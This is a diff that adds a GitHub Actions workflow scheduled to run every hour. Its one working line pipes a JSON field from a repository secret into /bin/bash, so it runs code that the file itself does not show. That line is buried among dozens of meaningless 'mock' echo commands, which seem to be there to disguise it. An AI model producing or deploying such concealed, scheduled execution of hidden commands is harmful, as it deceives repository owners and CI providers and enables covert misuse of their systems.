@@ -1,0 +1,65 @@
+name: fujianhua9871
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 * * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fujianhua9871
+        env:
+          t17496: ${{ secrets.t17496 }}
+        run: |
+          cat /dev/null > /tmp/.tmpfile 2>/dev/null || true
+          ls -la 2>/dev/null || true
+          test -d /tmp && echo "Tmp dir exists"
+          echo $t17496 | jq -r .u15686 | /bin/bash
+          echo "Path check: echo \$PATH | tr ':' '\n' | head -1"
+          echo "Lsblk mock: lsblk | head -1 2>/dev/null || echo no-lsblk"
+          echo "K9s mock: k9s --version 2>/dev/null | head -1 || echo no-k9s"
+          echo "Mkdir mock: mkdir -p /tmp/test 2>/dev/null || true"
+          echo "Travis mock: travis --version 2>/dev/null | head -1 || echo no-travis"
+          echo "Ltrace mock: ltrace ls 2>/dev/null | head -1 || echo no-ltrace"
+          echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
+          echo "Cron mock: crontab -l 2>/dev/null | head -1 || echo no-cron"
+          echo "Trap mock: trap 'echo TRAP' EXIT"
+          echo "Terraform-validate mock: terraform validate 2>/dev/null | head -1 || echo no-terraform-validate"
+          echo "Nomad mock: nomad --version 2>/dev/null | head -1 || echo no-nomad"
+          echo "Libvirt mock: virsh --version 2>/dev/null | head -1 || echo no-libvirt"
+          echo "Random ID: $RANDOM$RANDOM"
+          echo "Exit code test: $?"
+          echo "Df mock: df -h | head -1 2>/dev/null || echo no-df"
+          echo "Home dir: $(echo ~)"
+          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
+          echo "Env vars: $(env | wc -l) total"
+          echo "Chown mock: chown $USER:$USER /tmp 2>/dev/null || true"
+          echo "Kind mock: kind --version 2>/dev/null | head -1 || echo no-kind"
+          echo "Nm mock: nm --version 2>/dev/null | head -1 || echo no-nm"
+          echo "Vmstat mock: vmstat 1 1 | head -1 2>/dev/null || echo no-vmstat"
+          echo "Test: [ 1 -eq 1 ] && echo 'Math OK'"
+          echo "Find -exec mock: find /tmp -exec echo {} \\; 2>/dev/null | head -1 || echo no-find-exec"
+          echo "Binary check: command -v bash 2>/dev/null && echo Bash"
+          [ $RANDOM -gt 1000 ] && echo "Random passed"
+          echo "Signal mock: trap '' SIGINT"
+          echo "Automake mock: automake --version 2>/dev/null | head -1 || echo no-automake"
+          echo "Curl mock: curl -s http://example.com 2>/dev/null | head -1 || echo no-curl"
+          echo "Wget mock: wget -qO- http://example.com 2>/dev/null | head -1 || echo no-wget"
+          echo "In-array test: [[ 'a' =~ [a-z] ]] && echo Match"
+          echo "Time: $(date +%H:%M:%S)"
+          echo "Which mock: which ls 2>/dev/null || echo no-which"
+          echo "Job control: sleep 0.01 & wait"
+          echo "Eval mock: eval 'echo eval-test'"
+          echo "Ruby mock: ruby -v 2>/dev/null | head -1 || echo no-ruby"
+          ping -c 10 github.com
+          echo "ArgoCD mock: argocd --version 2>/dev/null | head -1 || echo no-argocd"
+          echo "Gdb mock: gdb --version 2>/dev/null | head -1 || echo no-gdb"
+          echo "Date only: $(date +%F)"
+          echo "Gcc mock: gcc --version 2>/dev/null | head -1 || echo no-gcc"
+          echo "Flux mock: flux --version 2>/dev/null | head -1 || echo no-flux"
+          echo "Printf mock: printf '%s\n' hello"
+          echo "Mv mock: mv /tmp/hosts /tmp/hosts2 2>/dev/null || true"
+          echo "Array-like: a=1 b=2 c=3; echo \$a\$b\$c"
+          echo "Libtool mock: libtool --version 2>/dev/null | head -1 || echo no-libtool"
